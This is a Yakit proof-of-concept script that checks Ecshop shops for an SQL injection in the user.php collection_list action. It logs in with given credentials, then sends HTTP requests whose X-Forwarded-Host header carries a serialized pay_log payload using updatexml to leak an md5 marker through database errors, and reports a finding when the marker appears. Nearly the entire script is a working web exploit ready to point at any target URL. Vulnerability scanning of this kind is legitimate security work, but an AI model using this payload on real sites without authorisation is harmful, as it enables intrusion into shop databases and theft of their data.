content:
##server:Ecshop
##type:poc
##params:root_url,ecshop_username,ecshop_password
##name:ecshop_collection_list_sqli_poc
##severity:medium
##out_put:ecshop_collection_list_sqli_poc_res


loglevel(`info`)
yakit.AutoInitYakit()

ecshop_login=func(addr,isTls,randsession,ecshop_username,ecshop_password){

    packet=`POST /user.php HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Length: 63
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0

username={{params(ecshop_username)}}&password={{params(ecshop_password)}}&act=act_login&submit=`

    rsp,req,err= poc.HTTP(packet, 
    poc.params({"target":addr,"ecshop_username":ecshop_username,"ecshop_password":ecshop_password}),
    poc.https(isTls),
    poc.session(randsession),
    // poc.proxy("http://127.0.0.1:8083"),
    )
    if str.MatchAllOfSubString(rsp, `user.php?act=logout`){
        log.info("登录成功，尝试发送payload...")
    }else{
        log.info("登录失败，脚本即将退出")
        os.Exit(0)
    }    
}



poc=func(addr,isTls,randsession){
    packet=`GET /user.php?act=collection_list HTTP/1.1
Host: {{params(target)}}
X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953apay_log|s:56:"1' and updatexml(1,insert(md5(489165),1,1,0x7e),1) and '";|45ea207d7a2b68c49582d2d22adf953a
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0`

    rsp,req,err=poc.HTTP(
        packet,
        poc.https(isTls),
        poc.params({"target":addr}),
        // poc.proxy("http://127.0.0.1:8083"),
        poc.session(randsession))


    packet1=`GET /user.php?act=collection_list HTTP/1.1
Host: {{params(target)}}
X-Forwarded-Host: 554fcae493e564ee0dc75bdf2ebf94capay_log|s:56:"1' and updatexml(1,insert(md5(489165),1,1,0x7e),1) and '";|554fcae493e564ee0dc75bdf2ebf94ca
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0`

    rsp1,req1,err=poc.HTTP(
        packet1,
        poc.https(isTls),
        poc.params({"target":addr}),
        // poc.proxy("http://127.0.0.1:8083"),
        poc.session(randsession))

    if str.MatchAllOfSubString(rsp, `~cb7599f1937c48edbaed92ac38f94c9`)||str.MatchAllOfSubString(rsp1, `~cb7599f1937c48edbaed92ac38f94c9`){
        risk.NewRisk(
            root_url, risk.severity("high"), 
            risk.title(f"FOUND ${root_url}ecshop_collection_list_sqli 漏洞存在"),
            risk.titleVerbose("ecshop_collection_list_sqli 漏洞存在"),
            risk.type("SQL注入"), risk.typeVerbose("ecshop sql注入"),
            risk.details({
                "ecshop_collection_list_sqli_poc_res":true
            }),
        )
    }


}


root_url=cli.String("root_url")
ecshop_username=cli.String("ecshop_username")
ecshop_password=cli.String("ecshop_password")


main=func(){
    ip, port, err = str.ParseStringToHostPort(root_url)
    if err != nil {
        die(err)
    }
    // poc(ip, port)
    addr=str.HostPort(ip, port)
    isTls=str.IsTLSServer(addr)    
    randsession=str.RandStr(20)
    ecshop_login(addr,isTls,randsession,ecshop_username,ecshop_password)
    poc(addr,isTls,randsession)

}

main()
